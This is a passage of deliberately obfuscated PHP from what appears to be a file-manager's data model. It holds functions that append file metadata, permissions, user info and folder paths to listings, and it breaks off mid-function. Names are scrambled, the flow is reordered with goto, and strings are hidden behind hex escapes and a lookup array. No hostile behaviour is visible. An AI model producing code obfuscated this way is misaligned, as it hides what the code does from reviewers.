_listAppendFileMeta(&$f¬¬ÒĞƒÊ›, $Aê‹–ÍÜÛ) { goto bˆŒ‹œ•‰Ù; A„ÒÈ‘¾Ë: foreach ($f¬¬ÒĞƒÊ› as &$eÉçÊö£ƒ) { goto C—…‰èÁÜ; C—…‰èÁÜ: $B§ä«›ŞÇÇ = $eÉçÊö£ƒ[$BÉ¾©Ê°Ú±[419]]; if (!$B§ä«›ŞÇÇ || !isset($DËÈœÄŒˆ[$B§ä«›ŞÇÇ])) { continue; } $EÃÌˆ‹šÏ = $DËÈœÄŒˆ[$B§ä«›ŞÇÇ]; goto Dóó¦Ğ÷å“; Dóó¦Ğ÷å“: $EÃÌˆ‹šÏ[$BÉ¾©Ê°Ú±[77]] = $eÉçÊö£ƒ[$BÉ¾©Ê°Ú±[77]]; $EÃÌˆ‹šÏ[$BÉ¾©Ê°Ú±[28]] = $eÉçÊö£ƒ[$BÉ¾©Ê°Ú±[28]]; self::$cacheFileInfo[$BÉ¾©Ê°Ú±[425] . $B§ä«›ŞÇÇ] = array_merge(array(), $EÃÌˆ‹šÏ); goto a©Ñçˆ•Üò; a©Ñçˆ•Üò: unset($DËÈœÄŒˆ[$B§ä«›ŞÇÇ][$BÉ¾©Ê°Ú±[75]]); $F–îÏ¡¶– = is_array($DÉ„”ÔÁ[$B§ä«›ŞÇÇ]) ? $DÉ„”ÔÁ[$B§ä«›ŞÇÇ] : array(); $eÉçÊö£ƒ[$BÉ¾©Ê°Ú±[162]] = array_merge($F–îÏ¡¶–, $DËÈœÄŒˆ[$B§ä«›ŞÇÇ]); goto e½ƒ×ë‘šÀ; e½ƒ×ë‘šÀ: if (isset($eÉçÊö£ƒ[$BÉ¾©Ê°Ú±[162]][$BÉ¾©Ê°Ú±[426]])) { $eÉçÊö£ƒ[$BÉ¾©Ê°Ú±[426]] = json_decode($eÉçÊö£ƒ[$BÉ¾©Ê°Ú±[162]][$BÉ¾©Ê°Ú±[426]], !0); unset($eÉçÊö£ƒ[$BÉ¾©Ê°Ú±[162]][$BÉ¾©Ê°Ú±[426]]); } goto eÒºÖ­ŒÑ…; eÒºÖ­ŒÑ…: } unset($eÉçÊö£ƒ); goto báõÂ£‚‰Ü; bˆŒ‹œ•‰Ù: $BÉ¾©Ê°Ú± =& $_SERVER[Å¸ş]; $D´Ø•¾àô = array_to_keyvalue($f¬¬ÒĞƒÊ›, $BÉ¾©Ê°Ú±[33], $BÉ¾©Ê°Ú±[419]); $D´Ø•¾àô = array_filter(array_unique($D´Ø•¾àô)); goto bÂÜ¦ ‡½ô; Dá¨âœÑ§à: $BâÔ“ê‰¯ó = $BâÔ“ê‰¯ó ? $BâÔ“ê‰¯ó : array(); $DÉ„”ÔÁ = array(); foreach ($BâÔ“ê‰¯ó as $B·ºÌöïµ) { if (!isset($DÉ„”ÔÁ[$B·ºÌöïµ[$BÉ¾©Ê°Ú±[419]]])) { $DÉ„”ÔÁ[$B·ºÌöïµ[$BÉ¾©Ê°Ú±[419]]] = array(); } $DÉ„”ÔÁ[$B·ºÌöïµ[$BÉ¾©Ê°Ú±[419]]][$B·ºÌöïµ[$BÉ¾©Ê°Ú±[89]]] = $B·ºÌöïµ[$BÉ¾©Ê°Ú±[359]]; } goto A„ÒÈ‘¾Ë; fÙÀ÷Ê”óè: $DËÈœÄŒˆ = Model($BÉ¾©Ê°Ú±[422])->field($cƒ¼–Ë¬Òˆ)->where($E¹Ò†êæ )->select(); $DËÈœÄŒˆ = array_to_keyvalue($DËÈœÄŒˆ, $BÉ¾©Ê°Ú±[419]); $BâÔ“ê‰¯ó = Model($BÉ¾©Ê°Ú±[423])->field($BÉ¾©Ê°Ú±[424])->where($E¹Ò†êæ )->select(); goto Dá¨âœÑ§à; bÂÜ¦ ‡½ô: if (!$D´Ø•¾àô) { return; } $E¹Ò†êæ  = array($BÉ¾©Ê°Ú±[420] => array($BÉ¾©Ê°Ú±[384], $D´Ø•¾àô)); $cƒ¼–Ë¬Òˆ = $BÉ¾©Ê°Ú±[421]; goto fÙÀ÷Ê”óè; báõÂ£‚‰Ü: } protected function _listAppendSourceInfo(&$FğÑ†£Ë¾, $bñšÎÁÅ±) { goto BÒØ‹È´õ½; DŒ×„ª¬ˆÍ: return $FğÑ†£Ë¾; goto f¤…ÇŞ‰©ª; Böáñİˆˆ: $CÙÕŸ®¬• = array_to_keyvalue_group($Eì¾¸Èô²‹, $eËó®È·ò[369]); foreach ($FğÑ†£Ë¾ as &$d»õ°éÒ©Š) { $d»õ°éÒ©Š[$eËó®È·ò[391]] = array($eËó®È·ò[430] => 0, $eËó®È·ò[431] => 0, $eËó®È·ò[432] => 0); if (isset($CÔ²ƒÜßö¯[$d»õ°éÒ©Š[$eËó®È·ò[369]]])) { $d»õ°éÒ©Š[$eËó®È·ò[391]][$eËó®È·ò[433]] = 1; $d»õ°éÒ©Š[$eËó®È·ò[391]][$eËó®È·ò[434]] = $CÔ²ƒÜßö¯[$d»õ°éÒ©Š[$eËó®È·ò[369]]][$eËó®È·ò[28]]; } if (isset($dË†ËÖ±…º[$d»õ°éÒ©Š[$eËó®È·ò[369]]])) { $d»õ°éÒ©Š[$eËó®È·ò[391]][$eËó®È·ò[435]] = array(); foreach ($dË†ËÖ±…º[$d»õ°éÒ©Š[$eËó®È·ò[369]]] as $E¤‘…Š×ƒ¸) { $cÉ¨ì’Ã™ó = $c­ÅåÇ¶©[$E¤‘…Š×ƒ¸]; $d»õ°éÒ©Š[$eËó®È·ò[391]][$eËó®È·ò[435]][] = array($eËó®È·ò[436] => $cÉ¨ì’Ã™ó[$eËó®È·ò[367]], $eËó®È·ò[386] => $cÉ¨ì’Ã™ó[$eËó®È·ò[28]], $eËó®È·ò[437] => $cÉ¨ì’Ã™ó[$eËó®È·ò[438]]); } } if (isset($CÙÕŸ®¬•[$d»õ°éÒ©Š[$eËó®È·ò[369]]])) { $d»õ°éÒ©Š[$eËó®È·ò[391]][$eËó®È·ò[439]] = array(); foreach ($CÙÕŸ®¬•[$d»õ°éÒ©Š[$eËó®È·ò[369]]] as $d‘Úéñšãõ) { $d»õ°éÒ©Š[$eËó®È·ò[391]][$eËó®È·ò[439]] = array($eËó®È·ò[440] => $d‘Úéñšãõ[$eËó®È·ò[441]], $eËó®È·ò[442] => $d‘Úéñšãõ[$eËó®È·ò[443]], $eËó®È·ò[444] => $d‘Úéñšãõ[$eËó®È·ò[369]], $eËó®È·ò[445] => $d‘Úéñšãõ[$eËó®È·ò[446]], $eËó®È·ò[447] => $d‘Úéñšãõ[$eËó®È·ò[448]], $eËó®È·ò[449] => $d‘Úéñšãõ[$eËó®È·ò[449]], $eËó®È·ò[450] => $d‘Úéñšãõ[$eËó®È·ò[450]]); } } } unset($d»õ°éÒ©Š); goto DŒ×„ª¬ˆÍ; BÒØ‹È´õ½: $eËó®È·ò =& $_SERVER[Å¸ş]; if (!defined($eËó®È·ò[427])) { return; } $B‡é²‹´È‰ = Model($eËó®È·ò[428])->listData(); goto F¼Ëñ‚‚ò; F¼Ëñ‚‚ò: $dª¹¾´ëâŞ = Model($eËó®È·ò[392])->listData(); $B­†õ¥å¡Ô = Model($eËó®È·ò[381])->listData(); $Eì¾¸Èô²‹ = Model($eËó®È·ò[429])->listSimple(); goto A“íœ¦åé™; A“íœ¦åé™: $c­ÅåÇ¶© = array_to_keyvalue($B‡é²‹´È‰, $eËó®È·ò[367]); $dË†ËÖ±…º = array_to_keyvalue_group($dª¹¾´ëâŞ, $eËó®È·ò[75], $eËó®È·ò[393]); $CÔ²ƒÜßö¯ = array_to_keyvalue($B­†õ¥å¡Ô, $eËó®È·ò[75]); goto Böáñİˆˆ; f¤…ÇŞ‰©ª: } protected function _listAppendChildren(&$dó£Á¼É¿, $E®ÖŸÂ¼µ) { goto a˜ Ò›‚ÆÍ; Bíİ›ğ›Á: $E²‹‹Ö‚ëİ = $this->tablePrefix . $this->tableName; for ($FêÃ¸‚ŒÇà = 0; $FêÃ¸‚ŒÇà < $aŸİÍõÔâÁ; $FêÃ¸‚ŒÇà++) { $c‹Ê®”°¢ì = intval($dó£Á¼É¿[$FêÃ¸‚ŒÇà][$d½˜ÖïÒÑ¶[397]]); if ($dó£Á¼É¿[$FêÃ¸‚ŒÇà][$d½˜ÖïÒÑ¶[370]]) { $Eš·…­Â£õ = $dó£Á¼É¿[$FêÃ¸‚ŒÇà][$d½˜ÖïÒÑ¶[369]]; $AèÏƒèää .= "\x53\105\114\x45\103\x54\x20\x2a\x20\106\122\x4f\115\x20\x28\x53\105\114\105\103\x54\40\47{$Eš·…­Â£õ}\137\150\x61\163\x46\x69\154\145\47\40\x61\163\x20\150\x61\x73\x2c\143\x6f\x75\156\164\x28\x31\51\40\x61\x73\40\150\x61\163\103\x6f\165\156\164\40\x46\122\117\x4d\40\140{$E²‹‹Ö‚ëİ}\x60\40\12\x9\x9\11\x9\11\167\x68\x65\162\x65\40\x70\x61\162\145\x6e\x74\x49\x44\75{$Eš·…­Â£õ}\40\141\156\144\x20\151\163\x46\157\x6c\x64\x65\x72\x3d\x30\40\x61\x6e\x64\40\x69\163\104\x65\154\145\x74\x65\75{$c‹Ê®”°¢ì}\51\40\141\x73\x20\x74\x62\x31\x5f{$Eš·…­Â£õ}\x20\x75\x6e\151\157\156\40\x61\x6c\x6c\x20\12\x9\11\11\11\11\123\x45\114\105\x43\124\40\52\40\106\122\117\115\40\50\123\x45\x4c\105\x43\124\x20\x27{$Eš·…­Â£õ}\x5f\x68\141\x73\x46\x6f\154\x64\x65\x72\47\40\x61\x73\x20\150\x61\x73\x46\x69\154\145\x2c\143\x6f\165\156\x74\50\x31\51\x20\x61\163\40\150\141\x73\103\x6f\165\156\164\x20\106\122\x4f\x4d\40\140{$E²‹‹Ö‚ëİ}\x60\40\12\11\x9\11\11\11\x77\x68\145\x72\145\40\x70\141\x72\x65\156\x74\x49\x44\75{$Eš·…­Â£õ}\x20\141\x6e\144\40\151\x73\x46\157\x6c\x64\x65\x72\x3d\61\x20\x61\x6e\x64\x20\x69\163\x44\145\x6c\145\164\145\x3d{$c‹Ê®”°¢ì}\x29\40\141\163\x20\x74\x62\x32\x5f{$Eš·…­Â£õ}\x20\x75\156\151\x6f\156\40\x61\154\x6c\x20"; } if ((strlen($AèÏƒèää) >= $B‹ÛäÚçˆ || $FêÃ¸‚ŒÇà == $aŸİÍõÔâÁ - 1) && $AèÏƒèää) { $AèÏƒèää = substr($AèÏƒèää, 0, -strlen($d½˜ÖïÒÑ¶[451])); $FøËÅ½º­¥ = $this->query($AèÏƒèää); $Aë¾ãÖ’…Õ = array_merge($Aë¾ãÖ’…Õ, $FøËÅ½º­¥); $AèÏƒèää = $d½˜ÖïÒÑ¶[33]; } } $Aë¾ãÖ’…Õ = array_to_keyvalue($Aë¾ãÖ’…Õ, $d½˜ÖïÒÑ¶[452]); goto Cæ˜—·Ÿ½; Bñ©°¿Ô¦ª: $B‹ÛäÚçˆ = 1024 * 50; $dó£Á¼É¿ = is_array($dó£Á¼É¿) ? $dó£Á¼É¿ : array(); $aŸİÍõÔâÁ = count($dó£Á¼É¿); goto Bíİ›ğ›Á; Cæ˜—·Ÿ½: foreach ($dó£Á¼É¿ as &$F†£¿åä‘‹) { if ($F†£¿åä‘‹[$d½˜ÖïÒÑ¶[370]]) { unset($F†£¿åä‘‹[$d½˜ÖïÒÑ¶[372]]); $F†£¿åä‘‹[$d½˜ÖïÒÑ¶[192]] = intval($Aë¾ãÖ’…Õ[$F†£¿åä‘‹[$d½˜ÖïÒÑ¶[369]] . $d½˜ÖïÒÑ¶[453]][$d½˜ÖïÒÑ¶[454]]); $F†£¿åä‘‹[$d½˜ÖïÒÑ¶[191]] = intval($Aë¾ãÖ’…Õ[$F†£¿åä‘‹[$d½˜ÖïÒÑ¶[369]] . $d½˜ÖïÒÑ¶[455]][$d½˜ÖïÒÑ¶[454]]); } } unset($F†£¿åä‘‹); goto e¡ÃĞ‘â¾; a˜ Ò›‚ÆÍ: $d½˜ÖïÒÑ¶ =& $_SERVER[Å¸ş]; $AèÏƒèää = $d½˜ÖïÒÑ¶[361]; $Aë¾ãÖ’…Õ = array(); goto Bñ©°¿Ô¦ª; e¡ÃĞ‘â¾: } protected function _listAppendAuth(&$EÎÌ¥Ú…) { goto f‹ùÙĞºğ¹; bœË²ç‹¬Î: $BÈö‚­›¸ = Model($e‹”ÈËâÂƒ[456])->getSourceList($C‡«‚º—Ê¶, $C÷ÄÂ±²ëÄ); foreach ($EÎÌ¥Ú… as $FÇÇæƒ… Í => &$cæÑ°¦°ã¨) { $cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[376]] = $BÈö‚­›¸[$cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[369]]]; if (!$cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[376]] && $cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[371]] == self::TYPE_GROUP) { $cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[376]] = Action($e‹”ÈËâÂƒ[457])->pathGroupAuthMake($cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[458]]); if (!$cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[376]] && !_get($GLOBALS, $e‹”ÈËâÂƒ[459])) { $cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[189]] = !1; $cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[188]] = !1; } } if ($cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[376]]) { $cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[189]] = AuthModel::authCheckEdit($cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[376]][$e‹”ÈËâÂƒ[377]]); $cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[188]] = AuthModel::authCheckView($cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[376]][$e‹”ÈËâÂƒ[377]]); } $this->groupPathDisplay($cæÑ°¦°ã¨); } unset($cæÑ°¦°ã¨); goto c³¨ÛÄÁø; E·ºÑŠÓ¶ù: foreach ($EÎÌ¥Ú… as $cæÑ°¦°ã¨) { if ($cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[371]] == self::TYPE_GROUP) { $C‡«‚º—Ê¶[] = $cæÑ°¦°ã¨[$e‹”ÈËâÂƒ[369]]; } } if (!$C‡«‚º—Ê¶) { return; } $C÷ÄÂ±²ëÄ = array_to_keyvalue($EÎÌ¥Ú…, $e‹”ÈËâÂƒ[369]); goto bœË²ç‹¬Î; f‹ùÙĞºğ¹: $e‹”ÈËâÂƒ =& $_SERVER[Å¸ş]; if (!defined($e‹”ÈËâÂƒ[427])) { return; } $C‡«‚º—Ê¶ = array(); goto E·ºÑŠÓ¶ù; c³¨ÛÄÁø: } public function groupPathDisplay(&$e±­ùÜâÎ) { goto dÙ„Æßç–¦; dÙ„Æßç–¦: $AÇ´Á«ÇÉ° =& $_SERVER[Å¸ş]; if ($e±­ùÜâÎ[$AÇ´Á«ÇÉ°[371]] != self::TYPE_GROUP) { return; } $b“ƒøŒ¬ÉÊ = Model($AÇ´Á«ÇÉ°[460])->getInfo($e±­ùÜâÎ[$AÇ´Á«ÇÉ°[458]]); goto aÈÈÄ›‚é¶; eá÷££á¯ª: $e±­ùÜâÎ[$AÇ´Á«ÇÉ°[462]] = $b“ƒøŒ¬ÉÊ[$AÇ´Á«ÇÉ°[463]]; $e±­ùÜâÎ[$AÇ´Á«ÇÉ°[380]] = $b“ƒøŒ¬ÉÊ[$AÇ´Á«ÇÉ°[461]]; $e±­ùÜâÎ[$AÇ´Á«ÇÉ°[464]] = $b“ƒøŒ¬ÉÊ[$AÇ´Á«ÇÉ°[465]]; goto CÙ±Û×¥À†; aÈÈÄ›‚é¶: $Fîç§º¨ = $this->parentLevelArray($b“ƒøŒ¬ÉÊ[$AÇ´Á«ÇÉ°[461]]); $E¬ï»ÂÇ“˜ = $AÇ´Á«ÇÉ°[33]; foreach ($Fîç§º¨ as $EÅ·ÍâêÍ) { $b¦ªŠšÅ²í = Model($AÇ´Á«ÇÉ°[460])->getInfo($EÅ·ÍâêÍ); $E¬ï»ÂÇ“˜ .= $b¦ªŠšÅ²í[$AÇ´Á«ÇÉ°[391]][$AÇ´Á«ÇÉ°[369]] . $AÇ´Á«ÇÉ°[47]; } goto eá÷££á¯ª; CÙ±Û×¥À†: $e±­ùÜâÎ[$AÇ´Á«ÇÉ°[466]] = $E¬ï»ÂÇ“˜ . $b“ƒøŒ¬ÉÊ[$AÇ´Á«ÇÉ°[391]][$AÇ´Á«ÇÉ°[369]]; goto B¬ãÁ‡¢àí; B¬ãÁ‡¢àí: } protected function _listAppendPath(&$Bµ®æåŸÁ¤) { goto fáˆ–èëé­; DªĞÄÇ÷…Ş: return $Bµ®æåŸÁ¤; goto D¥¨õ»Ù‚¡; fáˆ–èëé­: $C«·Ü‘¹ÅÂ =& $_SERVER[Å¸ş]; static $a¯¼ó„¿÷Ú = array(); $B¶ì²Æ¿è× = array(); goto EÑ­ÑñÒ¬â; EÑ­ÑñÒ¬â: foreach ($Bµ®æåŸÁ¤ as &$dé¹Í¾²Ô·) { $a¯¼ó„¿÷Ú[$dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[369]]] = $dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[28]]; $dÓ²ØôÂ¿¦ = $this->parentLevelArray($dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[461]]); foreach ($dÓ²ØôÂ¿¦ as $DÇù˜’ì‹É => $EÁ‹âŠò˜) { if ($DÇù˜’ì‹É != 0 && !isset($a¯¼ó„¿÷Ú[$EÁ‹âŠò˜])) { $B¶ì²Æ¿è×[] = $EÁ‹âŠò˜; } } } unset($dé¹Í¾²Ô·); if (count($B¶ì²Æ¿è×) > 0) { $e¥öÙ°­° = array($C«·Ü‘¹ÅÂ[383] => array($C«·Ü‘¹ÅÂ[384], $B¶ì²Æ¿è×)); if (count($B¶ì²Æ¿è×) == 1) { $fË“ëé‘øĞ = $this->sourceInfo($B¶ì²Æ¿è×[0]); $ağùëÁ› = is_array($fË“ëé‘øĞ) ? array($fË“ëé‘øĞ) : !1; } else { $ağùëÁ› = $this->field($C«·Ü‘¹ÅÂ[467])->where($e¥öÙ°­°)->select(); } $dÁ•ò¯Íæ = array_to_keyvalue($ağùëÁ›, $C«·Ü‘¹ÅÂ[369], $C«·Ü‘¹ÅÂ[28]); $a¯¼ó„¿÷Ú = array_merge_index($a¯¼ó„¿÷Ú, $dÁ•ò¯Íæ); } goto e‚“‚Í‘ª; e‚“‚Í‘ª: $a°ŒÇãè½ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($Bµ®æåŸÁ¤ as &$dé¹Í¾²Ô·) { goto b¤‚Ä¥´Œñ; Cèäæœ•»Š: if ($dÓ²ØôÂ¿¦) { $e¿¶ÅÇ‹Ï¼ .= $dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[28]]; } if ($dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[370]]) { $e¿¶ÅÇ‹Ï¼ .= $C«·Ü‘¹ÅÂ[8]; } $dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[468]] = str_replace($C«·Ü‘¹ÅÂ[469], $C«·Ü‘¹ÅÂ[8], $e¿¶ÅÇ‹Ï¼); goto CÅãù‘Ì¼ù; CÅãù‘Ì¼ù: $Bğ›ÌßÀ¤ó = trim($dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[468]], $C«·Ü‘¹ÅÂ[8]); if ($dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[463]] == $C«·Ü‘¹ÅÂ[470] && $Bğ›ÌßÀ¤ó) { $dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[28]] = $Bğ›ÌßÀ¤ó; } $this->_listAppendPathRecycle($dé¹Í¾²Ô·, $dÓ²ØôÂ¿¦, $a°ŒÇãè½); goto b¼ôÀš¯ê™; b¤‚Ä¥´Œñ: $dÓ²ØôÂ¿¦ = $this->parentLevelArray($dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[461]]); $e¿¶ÅÇ‹Ï¼ = $this->_listAppendPathRoot($dé¹Í¾²Ô·, $dÓ²ØôÂ¿¦); foreach ($dÓ²ØôÂ¿¦ as $DÇù˜’ì‹É => $EÁ‹âŠò˜) { if ($DÇù˜’ì‹É == 0 && $e¿¶ÅÇ‹Ï¼ && $dé¹Í¾²Ô·[$C«·Ü‘¹ÅÂ[371]] == self::TYPE_GROUP) { continue; } if (isset($a¯¼ó„¿÷Ú[$EÁ‹âŠò˜])) { $e¿¶ÅÇ‹Ï¼ .= $a¯¼ó„¿÷Ú[$EÁ‹âŠò˜] . $C«·Ü‘¹ÅÂ[8]; } } goto Cèäæœ•»Š; b¼ôÀš¯ê™: } unset($dé¹Í¾²Ô·); goto DªĞÄÇ÷…Ş; D¥¨õ»Ù‚¡: } private function _listAppendPathRecycle(&$A¡ä­˜„÷˜, $aØŒÑ¥ÆÆ­, $CˆÉ†Íé½) { goto BÇ‰áÛ°É’; A•ÃåÖ°ÇÇ: $A¡ä­˜„÷˜[$b‚ô™×«çí[461]] = $b‚ô™×«çí[472] . implode($b‚ô™×«çí[47], array_slice($aØŒÑ¥ÆÆ­, 1)) . $b‚ô™×«çí[47]; if ($A¡ä­˜„÷˜[$b‚ô™×«çí[369]] == $CˆÉ†Íé½) { $A¡ä­˜„÷˜[$b‚ô™×«çí[461]] = $b‚ô™×«çí[472]; $A¡ä­˜„÷˜[$b‚ô™×«çí[463]] = $b‚ô™×«çí[470]; $A¡ä­˜„÷˜[$b‚ô™×«çí[28]] = LNG($b‚ô™×«çí[471]); } $A¡ä­˜„÷˜[$b‚ô™×«çí[473]] = $b‚ô™×«çí[474]; goto aÒ§ñÆø; BÇ‰áÛ°É’: $b‚ô™×«çí =& $_SERVER[Å¸ş]; if (intval($A¡ä­˜„÷˜[$b‚ô™×«çí[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($CˆÉ†Íé½, $aØŒÑ¥ÆÆ­) && $A¡ä­˜„÷˜[$b‚ô™×«çí[369]] != $CˆÉ†Íé½) { return; } goto däâÊ„œŸ÷; däâÊ„œŸ÷: $d«¶â†è = explode($b‚ô™×«çí[8], trim($A¡ä­˜„÷˜[$b‚ô™×«çí[468]], $b‚ô™×«çí[8])); $côŒó•† = implode($b‚ô™×«çí[8], array_slice($d«¶â†è, 2)); $A¡ä­˜„÷˜[$b‚ô™×«çí[468]] = $b‚ô™×«çí[8] . LNG($b‚ô™×«çí[471]) . $b‚ô™×«çí[8] . ltrim($côŒó•†, $b‚ô™×«çí[8]); goto A•ÃåÖ°ÇÇ; aÒ§ñÆø: } protected function _listAppendPathRoot(&$f¥ñÀİÃÏ, $EÆè´˜ˆæˆ) { $Eí­ß¸±æ¬ =& $_SERVER[Å¸ş]; $d“ß™Šæ¬” = $Eí­ß¸±æ¬[33]; if ($f¥ñÀİÃÏ[$Eí­ß¸±æ¬[371]] == self::TYPE_USER) { if (defined($Eí­ß¸±æ¬[427]) && $f¥ñÀİÃÏ[$Eí­ß¸±æ¬[458]] == USER_ID) { $d“ß™Šæ¬” = LNG($Eí­ß¸±æ¬[475]); if (!$EÆè´˜ˆæˆ) { $f¥ñÀİÃÏ[$Eí­ß¸±æ¬[28]] = $d“ß™Šæ¬”; } } else { $cÊ æÚ Á„ = Model($Eí­ß¸±æ¬[476])->getInfoSimple($f¥ñÀİÃÏ[$Eí­ß¸±æ¬[458]]); $d“ß™Šæ¬” = LNG($Eí­ß¸±æ¬[477]) . $Eí­ß¸±æ¬[157] . $cÊ æÚ Á„[$Eí­ß¸±æ¬[28]] . $Eí­ß¸±æ¬[478]; } } else { if ($f¥ñÀİÃÏ[$Eí­ß¸±æ¬[371]] == self::TYPE_GROUP) { $cÊ æÚ Á„ = Model($Eí­ß¸±æ¬[460])->getInfoSimple($f¥ñÀİÃÏ[$Eí­ß¸±æ¬[458]]); $d“ß™Šæ¬” = $cÊ æÚ Á„[$Eí­ß¸±æ¬[28]]; } else { if ($f¥ñÀİÃÏ[$Eí­ß¸±æ¬[371]] == self::TYPE_SYSTEM) { $cÊ æÚ Á„ = $this->sourceInfo($EÆè´˜ˆæˆ[0], !0); $d“ß™Šæ¬” = $cÊ æÚ Á„[$Eí­ß¸±æ¬[28]]; } } } $d“ß™Šæ¬” = $d“ß™Šæ¬” ? $Eí­ß¸±æ¬[8] . $d“ß™Šæ¬” . $Eí­ß¸±æ¬[8] : $Eí­ß¸±æ¬[8]; return $d“ß™Šæ¬”; } protected function _listAppendUser(&$FÔñ—¦×•) { goto aØÈ˜Í‹ˆŸ; C¥öÙŞ«‚Ê: unset($EÒÆŞ¨„”¶); goto Aâ›º”ÚÀ; aØÈ˜Í‹ˆŸ: $eÏŒáõÇßĞ =& $_SERVER[Å¸ş]; $e‰îÚš÷ñ¸ = array_to_keyvalue($FÔñ—¦×•, $eÏŒáõÇßĞ[33], $eÏŒáõÇßĞ[378]); $EÃå‰Éœ³ = array_to_keyvalue($FÔñ—¦×•, $eÏŒáõÇßĞ[33], $eÏŒáõÇßĞ[379]); goto Eñªãà‹³ª; Eñªãà‹³ª: $B¿­½ùä“× = array_merge($e‰îÚš÷ñ¸, $EÃå‰Éœ³); $A½—İíÖœó = Model($eÏŒáõÇßĞ[479])->userListInfo($B¿­½ùä“×); foreach ($FÔñ—¦×• as &$EÒÆŞ¨„”¶) { $AèÕï‘¹…‚ = $EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[378]]; $EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[378]] = $A½—İíÖœó[$AèÕï‘¹…‚] ? $A½—İíÖœó[$AèÕï‘¹…‚] : !1; $AèÕï‘¹…‚ = $EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[379]]; $EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[379]] = $A½—İíÖœó[$AèÕï‘¹…‚] ? $A½—İíÖœó[$AèÕï‘¹…‚] : !1; if (isset($EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[417]]) && $EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[417]][$eÏŒáõÇßĞ[480]]) { $cÀ„³ÚÍÓ = $GLOBALS[$eÏŒáõÇßĞ[6]][$eÏŒáõÇßĞ[84]][$eÏŒáõÇßĞ[481]]; if ($EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[417]][$eÏŒáõÇßĞ[482]] <= time() - $cÀ„³ÚÍÓ) { $this->metaSet($EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[369]], $eÏŒáõÇßĞ[480], null); $this->metaSet($EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[369]], $eÏŒáõÇßĞ[482], null); unset($EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[417]][$eÏŒáõÇßĞ[480]]); continue; } $A¡…†»ôÛ¤ = $EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[417]][$eÏŒáõÇßĞ[480]]; $EÒÆŞ¨„”¶[$eÏŒáõÇßĞ[417]][$eÏŒáõÇßĞ[483]] = Model($eÏŒáõÇßĞ[479])->getInfoSimpleOuter($A¡…†»ôÛ¤); } } goto C¥öÙŞ«‚Ê; Aâ›º”ÚÀ: } public function parentLevelArray($a‚â¼íÏ) { $FÓÅÛØÏ‰ =& $_SERVER[Å¸ş]; $a‚â¼íÏ = explode($FÓÅÛØÏ‰[47], trim($a‚â¼íÏ, $FÓÅÛØÏ‰[47])); return array_remove_value($a‚â¼íÏ, $FÓÅÛØÏ‰[470]); } public function listAll($eÚºŞŞ‹À) { goto a‚ÆŒÉ¾ŞĞ; c…èñÔ÷ö: $this->_listAppendAuth($DÎ¥¶‚Øß¯); $this->_listAppendUser($DÎ¥¶‚Øß¯); $this->_listAppendPath($DÎ¥¶‚Øß¯); goto EÍÖ·Æ‹ïç; EÍÖ·Æ‹ïç: $DÎ¥¶‚Øß¯ = array_to_keyvalue($DÎ¥¶‚Øß¯, $BÙãÅÔ’âô[369]); $cÈÜŠÂÌî = "\57{$C¢ «àª˜†[$BÙãÅÔ’âô[28]]}\57"; $cÈÜŠÂÌî = $cÈÜŠÂÌî == $BÙãÅÔ’âô[469] ? $BÙãÅÔ’âô[8] : $cÈÜŠÂÌî; goto Däàğ®¬ˆî; A¡Õ³“ÉÍ: $Cò£†“Ğ»³ = $BÙãÅÔ’âô[488]; $fÈäÕÒ«èó = "\x4c\x45\x46\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x69\x6f\x5f\x66\x69\154\x65\40\x66\151\154\145\40\157\156\x20\163\x6f\165\162\x63\x65\x2e\146\x69\x6c\x65\x49\104\40\x3d\x20\x66\151\154\145\56\x66\151\x6c\x65\111\x44"; $DÎ¥¶‚Øß¯ = $this->alias($BÙãÅÔ’âô[489])->field($Cò£†“Ğ»³)->where($B¼ “Ê¯ùÓ)->join($fÈäÕÒ«èó)->select(); goto c…èñÔ÷ö; a‚ÆŒÉ¾ŞĞ: $BÙãÅÔ’âô =& $_SERVER[Å¸ş]; $C¢ «àª˜† = $this->sourceInfo($eÚºŞŞ‹À); $B¼ “Ê¯ùÓ = array($BÙãÅÔ’âô[484] => array($BÙãÅÔ’âô[485], $C¢ «àª˜†[$BÙãÅÔ’âô[461]] . $eÚºŞŞ‹À . $BÙãÅÔ’âô[486]), $BÙãÅÔ’âô[487] => 0); goto A¡Õ³“ÉÍ; Däàğ®¬ˆî: $c…½Ú­Û¡‘ = array(); foreach ($DÎ¥¶‚Øß¯ as $eé›½¦¹ï => $AÈ¹åÌŠÌë) { goto FÒ»ÇŒ ×Ê; EôçÍí: if (!$AÈ¹åÌŠÌë[$BÙãÅÔ’âô[370]]) { 